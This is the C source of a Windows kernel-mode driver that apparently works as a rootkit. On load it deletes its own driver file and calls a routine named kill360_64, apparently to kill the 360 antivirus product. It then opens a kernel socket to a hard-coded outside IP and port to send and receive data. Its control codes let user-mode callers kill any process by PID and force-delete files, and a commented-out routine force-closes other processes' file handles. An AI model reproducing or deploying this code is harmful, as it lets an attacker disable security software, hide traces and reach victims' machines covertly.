/*
LRM Kernel Mode Driver Part

Module: main.c

Description: Driver Entry

Author: lolita



MINI DOCUMENT

VOID InitializeObjectAttributes(
[out] POBJECT_ATTRIBUTES InitializedAttributes,
[in] PUNICODE_STRING ObjectName,
[in] ULONG Attributes,
[in] HANDLE RootDirectory,
[in, optional] PSECURITY_DESCRIPTOR SecurityDescriptor
);


*/




#include "internal.h"
#include "system.h"
#include "network.h"
#include "xlog.h"

#include "config.h"

PDEVICE_OBJECT g_pCtrlDO = NULL;
PKTHREAD g_pnThread;
HANDLE die = FALSE;




CHAR xKill1(DWORD32 dwPid);
CHAR xDel1(PCSTR path);
CHAR xKill2(DWORD32 dwPid);
NTSTATUS DelDriverFile(PUNICODE_STRING pUsDriverPath);
void kill360();
NTSTATUS kill360_64();
NTSTATUS xDelFile3(PCHAR pAsFileName);
void DriverUnload(PDRIVER_OBJECT pDriverObject) {
	xLog("DriverUnload Called");
	UNICODE_STRING usSymbolName;
	RtlInitUnicodeString(&usSymbolName, SYMBOLIC_NAME);

	IoDeleteSymbolicLink(&usSymbolName);
	if (g_pCtrlDO) {
		IoDeleteDevice(g_pCtrlDO);
		g_pCtrlDO = NULL;
	}
	
	freeWsk();
	
	//stop system thread
	//set a event?
	KeWaitForSingleObject(g_pnThread, Executive, KernelMode, FALSE, 0);
	ObDereferenceObject(g_pnThread);
	xLog("All Released, Closing Log File");
	//close log file
	die = TRUE;
	CloseLogFile();
}

NTSTATUS CCDispatch(PDEVICE_OBJECT pDeviceObject, PIRP pIrp) {
	xLog("CC Called");
	NTSTATUS status = STATUS_SUCCESS;
	pIrp->IoStatus.Status = status;
	pIrp->IoStatus.Information = 0;
	IoCompleteRequest(pIrp, IO_NO_INCREMENT);
	return status;
}

NTSTATUS DeviceControlDispatch(PDEVICE_OBJECT pDeviceObject, PIRP pIrp) {
	NTSTATUS status = STATUS_INVALID_PARAMETER;
	ULONG uOpSize = 0;
	
	if (pDeviceObject == g_pCtrlDO) {
		PIO_STACK_LOCATION stack = IoGetCurrentIrpStackLocation(pIrp);
		if (stack->MajorFunction == IRP_MJ_DEVICE_CONTROL) {
			//process it
			ULONG ctrlCode = stack->Parameters.DeviceIoControl.IoControlCode;
			//goto IRPCOMPLETE;
			//TEST
			if (ctrlCode == CC_TEST) {
				xLog("DC CC_TEST");
				//pid DWORD
				PVOID pBuffer = pIrp->AssociatedIrp.SystemBuffer;
				ULONG lInLen = stack->Parameters.DeviceIoControl.InputBufferLength;
				
				ULONG lOutLen = stack->Parameters.DeviceIoControl.OutputBufferLength;
				if (lInLen != sizeof(DWORD32)) {
					status = STATUS_INVALID_PARAMETER;
					//uOpSize = 0;
					goto IRPCOMPLETE;
				}
				//test code
				if (lOutLen != sizeof(DWORD32)) {
					status = STATUS_INVALID_PARAMETER;
					//uOpSize = 0;
					goto IRPCOMPLETE;
				}
				uOpSize = lOutLen;//too lazy to copy
				status = STATUS_SUCCESS;
			}
			else if (ctrlCode == CC_KILL1) {
				xLog("DC CC_KILL1");
				//pid DWORD
				PVOID pBuffer = pIrp->AssociatedIrp.SystemBuffer;
				ULONG lInLen = stack->Parameters.DeviceIoControl.InputBufferLength;

				ULONG lOutLen = stack->Parameters.DeviceIoControl.OutputBufferLength;
				if (lInLen != sizeof(DWORD32)) {
					status = STATUS_INVALID_PARAMETER;
					//uOpSize = 0;
					goto IRPCOMPLETE;
				}
				//test code
				if (lOutLen != sizeof(CHAR)) {
					status = STATUS_INVALID_PARAMETER;
					uOpSize = 0;
					goto IRPCOMPLETE;
				}

				DWORD32 dwPid = *((DWORD32 *)pBuffer);
				*((PCHAR)pBuffer) = xKill1(dwPid);
				
				uOpSize = sizeof(CHAR);
				status = STATUS_SUCCESS;
			}
			else if (ctrlCode == CC_KILL2) {
				xLog("DC CC_KILL2");
				//pid DWORD
				PVOID pBuffer = pIrp->AssociatedIrp.SystemBuffer;
				ULONG lInLen = stack->Parameters.DeviceIoControl.InputBufferLength;

				ULONG lOutLen = stack->Parameters.DeviceIoControl.OutputBufferLength;
				if (lInLen != sizeof(DWORD32)) {
					status = STATUS_INVALID_PARAMETER;
					//uOpSize = 0;
					goto IRPCOMPLETE;
				}
				//test code
				if (lOutLen != sizeof(CHAR)) {
					status = STATUS_INVALID_PARAMETER;
					uOpSize = 0;
					goto IRPCOMPLETE;
				}

				DWORD32 dwPid = *((DWORD32*)pBuffer);
				*((PCHAR)pBuffer) = xKill2(dwPid);

				uOpSize = sizeof(CHAR);
				status = STATUS_SUCCESS;
			}
			else if (ctrlCode == CC_DEL)
			{
				xLog("Default Delete Called");
				PSTR inStr = (PSTR)pIrp->AssociatedIrp.SystemBuffer;
				ULONG inLen = stack->Parameters.DeviceIoControl.InputBufferLength;
				inStr[inLen - 1] = 0;
				if (inLen > 700) {
					goto IRPCOMPLETE;
				}
				//PSTR kStr = ExAllocatePool2(POOL_FLAG_NON_PAGED, inLen + 16, 'loli');
				//RtlStringCbPrintfA(kStr, inLen + 16, "\\??\\%s", inStr);

				xDel1(inStr);
				//ExFreePoolWithTag(kStr, 'loli');
				status = STATUS_SUCCESS;

			}
			else if (ctrlCode == CC_DEL2)
			{
				xLog("Delete 2 Called");
				PSTR inStr = (PSTR)pIrp->AssociatedIrp.SystemBuffer;
				ULONG inLen = stack->Parameters.DeviceIoControl.InputBufferLength;
				inStr[inLen - 1] = 0;
				if (inLen > 700) {
					goto IRPCOMPLETE;
				}
				PSTR kStr = ExAllocatePool2(POOL_FLAG_NON_PAGED, inLen + 16, 'loli');
				if (kStr == NULL) {
					goto IRPCOMPLETE;
				}
				RtlStringCbPrintfA(kStr, inLen + 16, "\\??\\%s", inStr);
				xDelFile3(kStr);
				ExFreePoolWithTag(kStr, 'loli');
				status = STATUS_SUCCESS;

			}
			//next code
			//pending test
		}
	}
	
	IRPCOMPLETE:

	pIrp->IoStatus.Status = status;
	pIrp->IoStatus.Information = uOpSize;
	IoCompleteRequest(pIrp, IO_NO_INCREMENT);
	return status;
}

NTSTATUS systemThreadProc() {
	if (FALSE) {
		LARGE_INTEGER timeout;
		timeout.QuadPart = -10 * 1000 * 1000;
		timeout.QuadPart *= 15;
		KeDelayExecutionThread(KernelMode, FALSE, &timeout);
	}
	PCHAR msg = (PCHAR)ExAllocatePool2(
		POOL_FLAG_NON_PAGED,
		1024,
		'netb'
	);
	if (msg == NULL) {
		//fuck
		xLog("6");
		return *((PNTSTATUS)(NULL));
	}
	xLog("System Thread Started");
	PWSK_SOCKET pSocket;
	//try to connect to 47.243.50.89
	//init
	SOCKADDR_IN remoteAddr = { 0 };
	
	remoteAddr.sin_addr.S_un.S_un_b.s_b1 = 47;
	remoteAddr.sin_addr.S_un.S_un_b.s_b2 = 243;
	remoteAddr.sin_addr.S_un.S_un_b.s_b3 = 50;
	remoteAddr.sin_addr.S_un.S_un_b.s_b4 = 89;
	remoteAddr.sin_port = RtlUshortByteSwap(8777);
	remoteAddr.sin_family = AF_INET;
	//connect
	CONNECT_SOCKET:

	NTSTATUS status = ConnectWsk(&pSocket, (PSOCKADDR)&remoteAddr);
	if (!NT_SUCCESS(status)) {
		xLog("Connect Failed");
		RtlStringCbPrintfA(msg, 1024, "status code: 0x%08X", status);
		xLog(msg);
		goto HALT_THREAD;
	}
	//send
	RtlStringCbPrintfA(msg, 1024, "lolita winsock kernel message: 0x%08X\n", pSocket);
	status = SendWsk(pSocket, msg, strlen(msg));
	if (!NT_SUCCESS(status)) {
		xLog("Send Failed");
		RtlStringCbPrintfA(msg, 1024, "status code: 0x%08X", status);
		xLog(msg);
		goto CLOSE_SOCKET;
	}
	//send2
	RtlStringCbPrintfA(msg, 1024, "ExAllocatePool2 return: 0x%08X\n", msg);
	status = SendWsk(pSocket, msg, strlen(msg));
	if (!NT_SUCCESS(status)) {
		xLog("Send Failed");
		RtlStringCbPrintfA(msg, 1024, "status code: 0x%08X", status);
		xLog(msg);
		goto CLOSE_SOCKET;
	}
	//recv
	ULONG recvBytes = 0;
	memset(msg, 0, 1024);
	status = RecvWsk(pSocket, msg, 1000, &recvBytes);
	if (!NT_SUCCESS(status)) {
		xLog("Recv Failed");
		RtlStringCbPrintfA(msg, 1024, "status code: 0x%08X", status);
		xLog(msg);
		goto CLOSE_SOCKET;
	}
	
	if (recvBytes < 1024ul) {
		msg[recvBytes] = 0;
		xLog("stage debug ok");
	}
	else
	{
		msg[1000] = 0;
		//recvBytes = strlen(msg);
	}
	
	xLog("recv the following content");
	xLog(msg);
	RtlStringCbPrintfA(msg, 1024, "recvBytes: %lu", recvBytes);
	xLog(msg);
	//close
	CLOSE_SOCKET:
	status = CloseSocket(pSocket);
	if (!NT_SUCCESS(status)) {
		xLog("Close Failed");
		RtlStringCbPrintfA(msg, 1024, "status code: 0x%08X", status);
		xLog(msg);
		//ExFreePoolWithTag(msg, 'netb');
		//PsTerminateSystemThread(STATUS_SUCCESS);
		//return STATUS_SUCCESS;
	}

HALT_THREAD:

	
	ExFreePoolWithTag(msg, 'netb');
	PsTerminateSystemThread(STATUS_SUCCESS);
	return STATUS_SUCCESS;
}

NTSTATUS DriverEntry(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING pRegistryPath) {
	NTSTATUS status = STATUS_UNSUCCESSFUL;
	//create devices

	UNICODE_STRING usDeviceName;
	UNICODE_STRING usSymbolName;

	RtlInitUnicodeString(&usDeviceName, DEVICE_NAME);

	status = IoCreateDevice(pDriverObject, 0, &usDeviceName, FILE_DEVICE_UNKNOWN, 0, TRUE, &g_pCtrlDO);
	if (!NT_SUCCESS(status)) {
		DbgPrint("Device create failed?????? Unscience");
		return status;
	}
	g_pCtrlDO->Flags |= DO_BUFFERED_IO;
	RtlInitUnicodeString(&usSymbolName, SYMBOLIC_NAME);

	status = IoCreateSymbolicLink(&usSymbolName, &usDeviceName);
	if (!NT_SUCCESS(status)) {
		DbgPrint("Failed to create symboliclink");
		IoDeleteDevice(g_pCtrlDO);
		g_pCtrlDO = NULL;
		return status;
	}

	pDriverObject->MajorFunction[IRP_MJ_CREATE] = CCDispatch;
	pDriverObject->MajorFunction[IRP_MJ_CLOSE] = CCDispatch;
	pDriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DeviceControlDispatch;
	if (!PRODUCT_MODE) {
		pDriverObject->DriverUnload = DriverUnload;
	}
	//driver init finished
	//init log file
	InitLogFile();


	PUNICODE_STRING pusDriverPath = NULL;
	pusDriverPath = &((PKLDR_DATA_TABLE_ENTRY)pDriverObject->DriverSection)->FullDllName;
	//pDriverObject->DriverSection
	DelDriverFile(pusDriverPath);
	CLIENT_ID       clientId = { 0 };
	xDel1("C:\\test\\1.txt");
	kill360_64();
	initWsk();
	//create network system thread
	xLog("Creating System Thread");
	HANDLE hSysThread = NULL;
	PsCreateSystemThread(
		&hSysThread,
		NULL,
		NULL,
		NtCurrentProcess(),
		&clientId,
		systemThreadProc,
		NULL
	);
	//get network systh thread object
	
	ObReferenceObjectByHandle(
		hSysThread,
		THREAD_ALL_ACCESS,
		NULL,
		KernelMode,
		&g_pnThread,
		NULL
	);
	ZwClose(hSysThread);

	xLog("DriverEntry Finished");
	
	return status;
}















/*
void TryUnlockFile(PFILE_OBJECT FileObject)
{
	SYSTEM_HANDLE_INFORMATION HandleInformation1;
	ULONG RetLen = 0;
	PVOID Buffer;
	ZwQuerySystemInformation(SystemHandleInformation, &HandleInformation1, sizeof(HandleInformation1), &RetLen);
	if (RetLen)
	{
		POBJECT_NAME_INFORMATION ObjectNameInfo1 = (POBJECT_NAME_INFORMATION)ExAllocatePool(NonPagedPool, 2056);
		POBJECT_NAME_INFORMATION ObjectNameInfo2 = (POBJECT_NAME_INFORMATION)ExAllocatePool(NonPagedPool, 2056);
		ObjectNameInfo1->Name.Length = 2048;
		ObjectNameInfo2->Name.Length = 2048;
		Buffer = ExAllocatePool(PagedPool, RetLen + 4096);

		status = ObQueryNameString(FileObject, ObjectNameInfo2, ObjectNameInfo2->Name.Length, &RetLen);
		if (NT_SUCCESS(status) && Buffer && ObjectNameInfo1)
		{
			status = ZwQuerySystemInformation(SystemHandleInformation, Buffer, RetLen + 4096, &RetLen);
			if (NT_SUCCESS(status))
			{
				UCHAR ObjectTypeIndex = 0;
				PSYSTEM_HANDLE_INFORMATION HandleInformation2 = (PSYSTEM_HANDLE_INFORMATION)Buffer;
				for (int i = 0; i < HandleInformation2->NumberOfHandles; i++)
				{
					if (HandleInformation2->Handles[i].Object == FileObject)
					{
						ObjectTypeIndex = HandleInformation2->Handles[i].ObjectTypeIndex;
						Break;
					}
				}
				if (ObjectTypeIndex)
				{
					for (int i = 0; i < HandleInformation2->NumberOfHandles; i++)
					{
						if (HandleInformation2->Handles[i].ObjectTypeIndex == ObjectTypeIndex)
						{
							CLIENT_ID ClientId;
							HANDLE TargetProcessHandle = NULL;
							HANDLE CurrentProcessHandle = NULL;
							HANDLE TargetHandle = NULL;
							PVOID TargetFileObject = NULL;
							OBJECT_ATTRIBUTES oa;
							ULONG RetLen;
							InitializeObjectAttributes(&oa, NULL, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
							ClientId.UniqueProcess = HandleInformation2->Handles[i].UniqueProcessId;
							ClientId.UniqueThread = 0;
							status = ZwOpenProcess(&CurrentProcessHandle, PROCESS_ALL_ACCESS, &oa, &ClientId);
							if (NT_SUCCESS(status))
							{
								InitializeObjectAttributes(&oa, NULL, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
								ClientId.UniqueProcess = PsGetCurrentProcessId();
								ClientId.UniqueThread = 0;
								status = ZwOpenProcess(&TargetProcessHandle, PROCESS_ALL_ACCESS, &oa, &ClientId);
								if (NT_SUCCESS(status))
								{//从引用到该对象的进程复制一份句柄到当前进程
									status = ZwDuplicateObject(CurrentProcessHandle, HandleInformation2->Handles[i].HandleValue, TargetProcessHandle, &TargetHandle, 0, 0, DUPLICATE_SAME_ACCESS);
									if (NT_SUCCESS(status) && TargetHandle)
									{
										status = ObReferenceObjectByHandle(TargetHandle, GENERIC_READ, IoFileObjectType, 0, &TargetFileObject, 0);
										if (NT_SUCCESS(status) && MmIsAddressValid(TargetFileObject) && TargetFileObject->DeviceObject->DeviceType == FILE_DEVICE_DISK)
										{
											status = ObQueryNameString(TargetFileObject, ObjectNameInfo1, ObjectNameInfo1->Name.Length, &RetLen);
											if (NT_SUCCESS(status))
											{
												__try
												{
													if (RtlEqualUnicodeString(ObjectNameInfo1, ObjectNameInfo2, TRUE))
													{
														PEPROCESS Process = NULL;
														KAPC_STATE ApcState;
														HANDLE ProcessId = HandleInformation2->Handles[i].UniqueProcessId;
														HANDLE ObjectHandle = HandleInformation2->Handles[i].HandleValue;
														OBJECT_HANDLE_FLAG_INFORMATION Ohfi;
														if (ProcessId != 0 && ProcessId != 4 && ProcessId != 8)
														{
															status = PsLookupProcessByProcessId(ProcessId, &Process);
															if (NT_SUCCESS(status))
															{
																KeStackAttachProcess(Process, &ApcState);
																CmpSetHandleProtection(&Ohfi, FALSE);
																ZwClose(ObjectHandle);
																KeUnstackDetachProcess(&ApcState);
																if (Process)
																{
																	ObDereferenceObject(Process);
																	Process = NULL;
																}
															}
														}
													}
													else
													{
														HANDLE ThreadHandle = DecodeKernelHandle(HandleInformation2->Handles[i].HandleValue);
														PsCreateSystemThread(&ThreadHandle, THREAD_ALL_ACCESS, NULL, NULL, NULL, UnlockFileThread, ThreadHandle);
														ZwWaitForSingleObject(ThreadHandle, FALSE, NULL);
														ZwClose(ThreadHandle);
													}
												}
												__finally
												{
												}
											}
										}
									}
								}
							}


							if (TargetProcessHandle)
							{
								ZwClose(TargetProcessHandle);
								TargetProcessHandle = 0;
							}
							if (CurrentProcessHandle)
							{
								ZwClose(CurrentProcessHandle);
								CurrentProcessHandle = 0;
							}
							if (TargetHandle)
							{
								ZwClose(TargetHandle);
								TargetHandle = 0;
							}
							if (TargetFileObject)
							{
								ObfDereferenceObject(TargetFileObject);
								TargetFileObject = 0;
							}
						}
					}
				}
			}
		}
		if (Buffer)
			ExFreePool(Buffer);
		if (ObjectNameInfo1)
			ExFreePool(ObjectNameInfo1);
		if (ObjectNameInfo2)
			ExFreePool(ObjectNameInfo2);
	}
}*/